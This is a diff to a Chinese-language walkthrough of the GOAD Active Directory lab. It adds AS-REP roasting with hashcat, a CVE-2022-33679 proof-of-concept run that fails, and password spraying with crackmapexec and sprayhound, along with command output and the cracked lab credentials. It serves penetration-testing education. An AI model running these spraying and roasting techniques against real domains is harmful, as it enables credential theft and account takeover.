@@ -776,7 +776,7 @@ Script krb5-enum-users摘要:
 
 当爆破用户时，badpwdcount值不会增加
 
-用CME工具POC:
+用CME工具PoC:
 
 ```bash
  crackmapexec smb -u khal.drogo -p horse -d essos.local 192.168.56.12 --users
@@ -845,7 +845,9 @@ SMB         192.168.56.22   445    CASTELBLACK      public                      
 
 ### AS-REP Roast
 [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
->AS-REP烤饼（AS-REP roasting）是一种技术，可以获取选择了**不需要Kerberos预身份验证标志**的用户的密码哈希值
+>AS-REP烤饼(AS-REP roasting)是一种技术，可以获取选择了**不需要Kerberos预身份验证标志**的用户的密码哈希值
+
+>禁用预授权是一种危险的错误配置，攻击者可以简单地查询 KDC 以查找禁用预身份验证的用户，然后为每个用户请求 TGT，然后 TGT 可以从内存中转储并在暴力密码破解攻击中脱机使用，如果密码被破解，则攻击者将拥有域用户的有效凭据
 
 根据之前结果制作[字典](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/Workspace/north.sevenkingdoms.local-users.txt)
 ```bash
@@ -872,9 +874,11 @@ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:30a743660db54d8c4207ddead8
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 GetNPUsers摘要:
->这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。
+>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容,
 
 hashcat破解[brandon.stark.hash](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/Workspace/brandon.stark.hash)
+
+
 ```bash
 hashcat -a 0 -m 18200 brandon.stark.hash /usr/share/wordlists/rockyou.txt
 ```
@@ -882,3 +886,96 @@ hashcat -a 0 -m 18200 brandon.stark.hash /usr/share/wordlists/rockyou.txt
 * samwell.tarly:Heartsbane(用户描述)
 * brandon.stark:iseedeadpeople(AS-REP Roasting)
 
+### CVE-2022-33679
+
+该攻击针对已禁用预身份验证的 Windows 域帐户，并尝试进行加密降级攻击,适用范围使用禁用预身份验证和 RC4-MD4 加密方案
+
+发布到 Github的 [PoC](https://github.com/Bdenneu/CVE-2022-33679)
+
+```bash
+python3 CVE-2022-33679.py north.sevenkingdoms.local/brandon.stark 192.168.56.11
+```
+```bash
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT - Retrieving AS-REP
+[-] [Errno Connection error (north.sevenkingdoms.local:88)] [Errno -3] Temporary failure in name resolution
+```
+### Password Spray密码喷洒
+
+使用CME
+```bash
+ crackmapexec smb 192.168.56.11 -u north.sevenkingdoms.local-users.txt -p north.sevenkingdoms.local-users.txt --no-bruteforce --continue-on-succes
+ ```
+ ```bash
+ SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:sql_svc STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\samwell.tarly:samwell.tarly STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jon.snow:jon.snow STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\rickon.stark:rickon.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brandon.stark:brandon.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sansa.stark:sansa.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\robb.stark:robb.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\eddard.stark:eddard.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\krbtgt:krbtgt STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\vagrant:vagrant (Pwn3d!)
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\Guest:Guest STATUS_LOGON_FAILURE 
+SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\Administrator:Administrator STATUS_LOGON_FAILURE 
+```
+我们可以用有效用户尝试 sprayhound 以避免锁定帐户
+
+选项-t设置是剩余尝试次数,如果设置为2，并且密码策略在 5 次登录失败后锁定帐户，则sprayhound将不会测试badpwdcount为3(及更多)的用户
+
+```bash
+# User as pass with password lowercase
+
+sprayhound -U north.sevenkingdoms.local-users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
+```
+```bash
+[+] Login successful
+[+] Successfully retrieved password policy (Threshold: 5)
+[+] Successfully retrieved 16 users
+[+] 4 users will be tested
+[+] 12 users will not be tested
+    Continue? [Y/n] Y
+    Continue? [Y/n] y
+[+] [  VALID  ] vagrant : vagrant
+[+] [  VALID  ] hodor : hodor
+[+] 2 user(s) have been owned !
+    Do you want to set them as 'owned' in Bloodhound ? [Y/n] n
+[!] Ok, master. Bye.
+```
+用CME查看下锁定次数
+```bash
+crackmapexec smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
+```
+```bash
+SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        badpwdcount: 3 desc: sql service
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   badpwdcount: 3 desc: Jeor Mormont
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  badpwdcount: 3 desc: Samwell Tarly (Password : Heartsbane)
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       badpwdcount: 3 desc: Jon Snow
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          badpwdcount: 0 desc: Brainless Giant
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   badpwdcount: 3 desc: Rickon Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  badpwdcount: 3 desc: Brandon Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    badpwdcount: 3 desc: Sansa Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\robb.stark                     badpwdcount: 0 desc: Robb Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\catelyn.stark                  badpwdcount: 3 desc: Catelyn Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\eddard.stark                   badpwdcount: 1 desc: Eddard Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     badpwdcount: 3 desc: Arya Stark
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\krbtgt                         badpwdcount: 3 desc: Key Distribution Center Service Account
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\vagrant                        badpwdcount: 0 desc: Vagrant User
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          badpwdcount: 3 desc: Built-in account for guest access to the computer/domain
+SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
+```
+现在获得了三对凭据：
+* samwell.tarly:Heartsbane(用户描述)
+* brandon.stark:iseedeadpeople(作为责备)
+* hodor:hodor(密码喷雾)
+* ~~vagrant:vagrant(密码喷雾)~~
